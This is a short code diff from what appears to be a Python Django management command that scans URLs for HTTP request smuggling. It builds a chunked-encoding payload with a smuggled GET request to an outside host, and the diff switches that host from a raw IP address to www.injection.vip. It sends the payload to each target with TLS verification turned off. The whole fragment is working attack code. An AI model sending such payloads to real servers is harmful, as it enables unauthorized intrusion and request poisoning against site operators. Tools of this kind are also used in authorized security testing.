@@ -37,7 +37,7 @@ class Command(BaseCommand):
             h[te_key] = te_value
             print('+ ' + url)
             print(h)
-            data = "0\r\n\r\nGET http://106.12.22.125:6957/toolkit/smuggler HTTP/1.1\r\nHost: baidu.com\r\nX: X\r\n\r\n"
+            data = "0\r\n\r\nGET http://www.injection.vip/toolkit/smuggler HTTP/1.1\r\nHost: baidu.com\r\nX: X\r\n\r\n"
             print(data)
             try:
                 res = requests.post(url, headers=h, verify=False, timeout=30, data=data)
